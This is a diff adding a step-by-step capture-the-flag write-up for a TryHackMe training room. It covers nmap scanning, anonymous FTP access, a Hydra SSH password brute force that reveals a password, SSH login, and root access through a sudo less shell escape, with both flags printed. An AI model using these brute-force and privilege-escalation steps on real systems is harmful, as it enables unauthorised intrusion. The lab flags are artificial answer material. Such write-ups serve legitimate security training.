@@ -1,34 +1,192 @@
 # Room Information
 
-Room link:
+Room link: https://tryhackme.com/room/brooklynninenine
 
 **Please feel free to point out any errors that you may see in this writeup!**
 
-This writeup was last updated: 6/26/2023
+This writeup was last updated: 6/29/2023
 
 # Scanning and Enumeration
-> Step
+> Port Scanning Using Nmap 
+1. Started up this room’s machine
+2. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt` to perform a network scan to scan for open ports while utilizing default scripts (**-sC**) and version detection (**-sV**) to identify services, as well as their versions, and vulnerabilities on the target system, and then redirect the results into a text file
+3. `cat {FILENAME1}.txt` to output the scan results from the previous command
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nmap -sC -sV 10.10.169.224 > PortScan.txt
+
+```
+```bash
+
+```
 
 #
-> Step
+> Scanning the FTP Server
+4. `ftp Anonymous@{TARGET IP}`
+```bash
+┌──(kali㉿kali)-[~]
+└─$ ftp Anonymous@10.10.169.224              
+Connected to 10.10.169.224.
+220 (vsFTPd 3.0.3)
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp>
+```
+5. `ls -a`
+6. `get {FILE1}.txt`
+7. `exit`
+```bash
+ftp> ls -a
+229 Entering Extended Passive Mode (|||21935|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        114          4096 May 17  2020 .
+drwxr-xr-x    2 0        114          4096 May 17  2020 ..
+-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
+226 Directory send OK.
+```
+```bash
+ftp> get note_to_jake.txt
+local: note_to_jake.txt remote: note_to_jake.txt
+229 Entering Extended Passive Mode (|||24115|)
+150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
+100% |***********************************************************************|   119        1.30 KiB/s    00:00 ETA
+226 Transfer complete.
+119 bytes received in 00:00 (0.66 KiB/s)
+```
+```bash
+ftp> exit
+221 Goodbye.
+```
+8. `ls`
+9. `cat {FILE1}.txt`
+```bash
+┌──(kali㉿kali)-[~]
+└─$ ls
+ note_to_jake.txt
+```
+```bash
+┌──(kali㉿kali)-[~]
+└─$ cat note_to_jake.txt 
+From Amy,
+
+Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
+```
 
 # Vulnerability Identification
-> 
+> Brute Forcing Using Hydra
+10. `hydra -l {USER} -P {WORDLIST PATH} ssh://{TARGET IP}`
+```bash
+┌──(kali㉿kali)-[~]
+└─$ hydra -l jake -P rockyou.txt ssh://10.10.169.224
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
-#
-> Step
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-29 08:24:54
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
+[DATA] attacking ssh://10.10.169.224:22/
+[22][ssh] host: 10.10.169.224   login: jake   password: 987654321
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 3 final worker threads did not complete until end.
+[ERROR] 3 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-29 08:25:41
+```
 
 # Vulnerability Exploitation
-> Step
-
-#
-> Step
+> Connecting Using SSH
+11. `ssh {USER}@{TARGET IP} -p 22`
+```bash
+┌──(kali㉿kali)-[~]
+└─$ ssh jake@10.10.169.224 -p 22                
+The authenticity of host '10.10.169.224 (10.10.169.224)' can't be established.
+ED25519 key fingerprint is SHA256:ceqkN71gGrXeq+J5/dquPWgcPWwTmP2mBdFS2ODPZZU.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.169.224' (ED25519) to the list of known hosts.
+jake@10.10.169.224's password: 
+Last login: Tue May 26 08:56:58 2020
+jake@brookly_nine_nine:~$ 
+```
+12. `ls /`
+13. `ls /home`
+14. `ls /home/holt`
+15. `cat /home/holt/{USER TEXT FILE}`
+```bash
+jake@brookly_nine_nine:~$ ls /
+bin   cdrom  etc   initrd.img      lib    lost+found  mnt  proc  run   snap  sys  usr  vmlinuz
+boot  dev    home  initrd.img.old  lib64  media       opt  root  sbin  srv   tmp  var  vmlinuz.old
+```
+```bash
+jake@brookly_nine_nine:~$ ls /home
+amy  holt  jake
+```
+```bash
+jake@brookly_nine_nine:~$ ls /home/holt
+nano.save  user.txt
+```
+```bash
+jake@brookly_nine_nine:~$ cat /home/holt/user.txt
+ee11cbb19052e40b07aac0ca060c23ee
+```
 
 # Post Exploitation
-> Step
+> Privilege Escalation
+16. `sudo -l`
+```bash
+jake@brookly_nine_nine:~$ sudo -l
+Matching Defaults entries for jake on brookly_nine_nine:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
-#
-> Step
+User jake may run the following commands on brookly_nine_nine:
+    (ALL) NOPASSWD: /usr/bin/less
+```
+17. `firefox "https://gtfobins.github.io/"
+
+![]()
+
+18. `sudo less /etc/profile`
+```bash
+jake@brookly_nine_nine:~$ sudo less /etc/profile
+```
+
+![]()
+
+20. `!/bin/sh`
+ 
+![]()
+
+21. `whoami`
+22. `ls /root`
+23. `cat /root/{ROOT TEXT FILE}`
+```bash
+# whoami
+root
+```
+```bash
+# ls /root
+root.txt
+```
+```bash
+# cat /root/root.txt
+-- Creator : Fsociety2006 --
+Congratulations in rooting Brooklyn Nine Nine
+Here is the flag: 63a9f0ea7bb98050796b649e85481845
+
+Enjoy!!
+```
+
+**Room completed!**
+
+![]()
+
+# Command History
+
+# Dissecting Some Commands
 
 # Contributions
 This writeup was made by Jonmar Corpuz, founder of **KnowCybersecurity** (www.knowwwcybersecurity.com)
